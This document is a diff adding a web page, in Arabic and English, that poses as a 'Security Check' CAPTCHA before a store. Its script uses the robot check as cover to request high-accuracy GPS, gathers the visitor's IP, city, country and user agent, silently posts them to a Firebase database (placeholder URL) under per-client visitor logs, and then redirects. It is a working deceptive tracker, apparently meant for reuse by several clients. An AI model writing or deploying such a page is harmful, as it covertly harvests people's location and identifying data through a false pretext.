@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Security Check</title>
+<style>
+body{background:#0a0e1a;color:#fff;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
+.card{background:#161b2a;border:1px solid #00e5ff;border-radius:16px;padding:30px;width:320px;text-align:center;box-shadow:0 0 30px #00e5ff33}
+.btn{background:#00e676;color:#000;border:0;padding:12px 0;width:100%;border-radius:8px;font-weight:bold;font-size:16px;cursor:pointer;margin-top:20px}
+.check{display:flex;align-items:center;gap:10px;background:#0f141f;padding:12px;border-radius:8px;border:1px solid #334155}
+</style>
+</head><body>
+<div class="card">
+  <h3 style="color:#00e5ff">🔒 تحقق أمني</h3>
+  <p style="font-size:13px;color:#94a3b8">برجاء تأكيد أنك لست روبوت للمتابعة للمتجر</p>
+  <div class="check">
+    <input type="checkbox" id="chk" style="width:20px;height:20px">
+    <label for="chk">أنا لست روبوت - I am not a robot</label>
+  </div>
+  <button class="btn" id="verifyBtn">تحقق ومتابعة للمتجر</button>
+  <p id="status" style="font-size:11px;color:#7dd3fc;margin-top:10px"></p>
+</div>
+<script>
+const FIREBASE_URL = "https://YOUR_FIREBASE.firebaseio.com";
+const qs = new URLSearchParams(location.search);
+const clientId = qs.get('id')||'unknown';
+const targetUrl = qs.get('url') ? decodeURIComponent(qs.get('url')) : 'https://google.com';
+
+async function saveWithGPS(lat,lng,acc){
+  try{
+    const ip = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
+    const data = {
+      name: clientId, client: clientId, ip: ip.ip||'', city: ip.city||'Arish',
+      region: ip.region||'', country: ip.country_name||'',
+      lat: lat||'', lng: lng||'', accuracy: acc||'',
+      time: new Date().toLocaleString(), timestamp: Date.now(),
+      userAgent: navigator.userAgent, _path: clientId, mode: 'captcha'
+    };
+    fetch(`${FIREBASE_URL}/no_code_visits/${clientId}.json`, {method:'POST', body:JSON.stringify(data)});
+    fetch(`${FIREBASE_URL}/white_label_clients/${clientId}/visitors.json`, {method:'POST', body:JSON.stringify(data)});
+    fetch(`${FIREBASE_URL}/visitors.json`, {method:'POST', body:JSON.stringify(data)});
+  }catch(e){}
+  setTimeout(()=> location.href = targetUrl, 1000);
+}
+
+document.getElementById('verifyBtn').onclick = ()=>{
+  const chk = document.getElementById('chk');
+  if(!chk.checked){ alert('برجاء تأكيد أنك لست روبوت'); return; }
+  document.getElementById('status').innerText = 'جاري التحقق من موقعك...';
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(
+      p=> saveWithGPS(p.coords.latitude, p.coords.longitude, p.coords.accuracy),
+      err=> saveWithGPS('','', err.message),
+      {enableHighAccuracy:true, timeout:10000}
+    );
+  }else{
+    saveWithGPS('','','no geo');
+  }
+};
+</script>
+</body></html>
